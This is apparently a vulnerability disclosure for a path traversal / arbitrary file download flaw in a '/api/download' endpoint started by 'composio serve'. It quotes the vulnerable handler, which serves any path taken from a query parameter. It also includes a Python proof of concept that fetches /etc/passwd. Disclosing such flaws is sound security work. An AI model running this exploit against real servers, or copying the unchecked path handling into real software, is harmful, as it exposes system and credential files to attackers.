# Description

Attackers can download arbitrary file via this endpoint by sending a get request

```python
    @app.get("/api/download")
    def _download_file_or_dir(request: Request):
        """Get list of available developer tools."""
        path = Path(request.query_params["file"])
        if not path.exists():
            return Response(
                content=APIResponse[None](
                    data=None,
                    error=f"{path} not found",
                ).model_dump_json(),
                status_code=404,
            )

        if path.is_file():
            return FileResponse(path=path)

        tempdir = tempfile.TemporaryDirectory()
        zipfile = Path(tempdir.name, path.name + ".zip")
        return FileResponse(path=_archive(directory=path, output=zipfile))

    return app

```

## PoC

Serve via `composio serve`

```python
import requests

url = "http://127.0.0.1:8000/api"

session = requests.Session()
session.trust_env = False
cont = session.get(
    url = url + '/download',
    params = {'file' : '/etc/passwd'} 
)

print(cont.content)
```

# Impact

Arbitary File leakage